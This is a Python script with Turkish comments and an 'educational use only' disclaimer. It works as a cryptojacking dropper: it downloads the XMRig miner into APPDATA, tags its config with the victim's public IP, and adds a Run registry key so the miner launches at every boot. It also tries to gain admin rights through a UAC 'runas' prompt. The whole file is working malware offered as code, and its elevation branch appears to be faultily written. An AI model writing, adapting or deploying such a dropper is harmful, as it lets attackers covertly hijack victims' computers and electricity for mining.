# BU PROJE YALNIZCA EGITIM AMACLI OLARAK OLUSTURULMUSTUR VE YALNIZCA YASAL VE ETIK BIR ORTAMDA KULLANILMASI AMACLIDIR.
# YAZILIM, HERHANGI BIR SEKILDE KOTU NIYETLI VEYA YASADISI FAALIYETLERDE KULLANILMAMALIDIR.
# Creator: linkedin.com/in/cihan-ozcan-603b4b253/

import os
import sys
import requests
import zipfile
import winreg
import shutil
import ctypes
import subprocess
import json
import socket
import requests

def is_admin():
      # Kullanýcýnýn yönetici olup olmadýðýný kontrol eder
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def download_file(url, target_dir):
     # Belirtilen URL'deki dosyayý belirtilen hedef dizine indirir
    local_filename = url.split('/')[-1]
    download_path = os.path.join(target_dir, local_filename)
    with requests.get(url, stream=True) as r:
        r.raise_for_status()
        with open(download_path, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192): 
                f.write(chunk)
    return download_path

def extract_zip(zip_path, extract_path):
        # Belirtilen zip dosyasýný belirtilen çýkartma yoluna çýkartýr ve ardýndan zip dosyasýný siler
    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
        zip_ref.extractall(extract_path)
    
   
    os.remove(zip_path)

def add_to_startup(file_path):
        # Belirtilen dosyayý Windows baþlangýç dizinine ekler, böylece bilgisayar her açýldýðýnda dosya çalýþtýrýlýr
    key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        winreg.KEY_SET_VALUE)

    winreg.SetValueEx(key, "XMRig", 0, winreg.REG_SZ, file_path)
    winreg.CloseKey(key)

def get_public_ip_address():
        # Kullanýcýnýn genel IP adresini döndürür
    try:
        response = requests.get('https://api.ipify.org?format=json')
        if response.status_code == 200:
            data = response.json()
            public_ip = data.get('ip')
            return public_ip
        else:
            print("Failed to get public IP address.")
    except Exception as e:
        print("Error:", e)
    return None

def update_user_agent():
        # XMRig yapýlandýrma dosyasýný günceller ve kullanýcýnýn genel IP adresini user-agent olarak ayarlar
    xmrig_dir = os.path.join(os.getenv('APPDATA'), "XMRig", "xmrig-6.20.0") 
    config_path = os.path.join(xmrig_dir, "config.json")

    if os.path.exists(config_path):
        with open(config_path, 'r') as config_file:
            config = json.load(config_file)

        if config.get("user-agent") is None:
            user_agent_ip = get_public_ip_address()
            if user_agent_ip:
                config["user-agent"] = f"Client/{user_agent_ip}"
            else:
                print("Failed to get public IP address.")

        with open(config_path, 'w') as config_file:
            json.dump(config, config_file, indent=4)

def start_xmrig():
        # XMRig'i indirir, çýkartýr ve baþlangýçta çalýþacak þekilde ayarlar
    xmrig_url = "https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-gcc-win64.zip"  
    appdata_path = os.getenv('APPDATA')  
    xmrig_dir = os.path.join(appdata_path, "XMRig")
    os.makedirs(xmrig_dir, exist_ok=True)

    xmrig_zip_path = download_file(xmrig_url, xmrig_dir)  
    extract_zip(xmrig_zip_path, xmrig_dir)  
    xmrig_path = os.path.join(xmrig_dir, "xmrig-6.20.0", "xmrig.exe")  

    update_user_agent()

    add_to_startup(xmrig_path)

def run_as_admin(cmd):
        # Belirtilen komutu yönetici olarak çalýþtýrýr
    try:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, cmd, None, 1)
    except:
        pass

if __name__ == "__main__":
        # Kullanýcý yönetici ise XMRig'i baþlatýr, deðilse yönetici olarak çalýþtýrmayý dener
    if is_admin():
        start_xmrig()
    else:
        xmrig_path = os.path.join(os.getenv('APPDATA'), "XMRig", "xmrig-6.20.0", "xmrig.exe")
        run_as_admin(xmrig_path)
